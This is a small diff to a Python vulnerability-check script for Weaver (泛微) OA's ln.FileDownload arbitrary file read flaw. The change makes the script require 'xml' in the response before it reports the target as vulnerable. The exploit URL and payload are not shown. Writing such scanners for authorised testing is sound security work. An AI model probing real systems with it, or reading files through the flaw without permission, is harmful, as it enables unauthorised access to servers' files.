@@ -24,7 +24,7 @@ def main(target_url):
     try:
         requests.packages.urllib3.disable_warnings()
         response=requests.get(url=exp_url, headers=headers,verify=False)
-        if response.status_code== 200:
+        if response.status_code== 200 and 'xml' in response.text:
             console.print(now_time() + ' [SUCCESS]  泛微OA ln.FileDownload 接口存在任意文件读取漏洞:{}'.format(exp_url), style='bold green')
         else:
             console.print(now_time() + ' [WARNING]  泛微OA任意文件读取漏洞不存在', style='bold red ')
